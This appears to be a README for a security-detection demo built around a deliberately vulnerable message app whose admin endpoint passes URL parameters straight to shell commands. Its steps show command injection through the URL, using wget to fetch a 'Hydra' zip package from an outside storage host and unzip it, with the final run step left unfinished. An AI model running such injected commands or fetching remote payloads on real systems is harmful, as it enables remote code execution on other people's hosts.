# Hydra scenario

This application lets you write messages, whatever they are (it is certainly possible to hack the message form by itself).
This is entirely managed in-memory, so dev team decided to add endpoints where you can check your log file and decide to load messages directly from the log in case of a restart.

Hitting the http://{yourhost}:{port}/ will let you add messages. 

Hitting http://{yourhost}:{port}/admin lets you start the actual hack by passing command

# Steps

1. Start browsing the app at http://{yourhost}:{port}/, explaining this is the same scenario as having [EVAL command available in Redis](https://redis.io/commands/eval).
2. Then move the the admin page and show the tail or cat command. 
3. Explain you have those links to decide if you'll hydrate messages from the log file or not. But there is an issue as the cat/tail link let you run arbitrary command on the host.
4. Type in the url bar http://{yourhost}:{port}/admin/ops?cmd=wget&args=https://storage.googleapis.com/nwlw-raw-data/sapp.zip . This will download a Hydra pre-packed zip package. (should triggered the 1st alert in LW)
5. Move to http://{yourhost}:{port}/admin/ops?cmd=unzip&args=sapp.zip
6. Last step you can run it using the URL ... Still progressing on packaging the zip to effictively run it

